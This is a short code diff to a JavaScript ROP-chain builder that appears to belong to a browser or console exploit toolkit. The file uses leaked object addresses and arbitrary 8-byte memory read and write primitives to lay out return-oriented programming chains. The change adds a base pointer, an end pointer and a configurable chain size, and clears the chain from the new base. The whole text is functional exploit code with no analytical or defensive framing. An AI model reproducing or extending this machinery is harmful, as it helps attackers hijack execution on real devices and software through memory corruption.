@@ -73,17 +73,24 @@ var krop = function(p, addr) {
 
 /* Called to start a new ROP chain */
 var rop = function(p, addr) {
+  this.ropChainSize = 0x4000;
   this.ropChain = undefined;
+  this.ropChainBasePtr = undefined;
   this.ropChainPtr = undefined;
+  this.ropChainEndPtr = undefined;
 
   if(addr == undefined)
   {
-    this.ropChain    = new Uint32Array(0x4000);
-    this.ropChainPtr = p.read8(p.leakval(this.ropChain).add32(0x28));
+    this.ropChain        = new Uint32Array((this.ropChainSize/4)*2);
+    this.ropChainBasePtr = p.read8(p.leakval(this.ropChain).add32(0x28)).add32(this.ropChainSize);
+    this.ropChainPtr     = this.ropChainBasePtr.add32(8);
+    this.ropChainEndPtr  = this.ropChainBasePtr.add32(this.ropChainSize);
   }
   else
   {
-    this.ropChainPtr = addr;
+    this.ropChainBasePtr = addr.add32(0);
+    this.ropChainPtr     = addr.add32(8);
+    this.ropChainEndPtr  = addr.add32(this.ropChainSize);
   }
 
   this.count = 0;
@@ -94,9 +101,9 @@ var rop = function(p, addr) {
     this.count = 0;
     this.runtime = undefined;
 
-    for(var i = 0; i < 0x4000 - 0x8; i += 8)
+    for(var i = 0; i < this.ropChainSize-8; i += 8)
     {
-      p.write8(this.ropChainPtr.add32(i), 0);
+      p.write8(this.ropChainBasePtr.add32(i), 0);
     }
   };
 
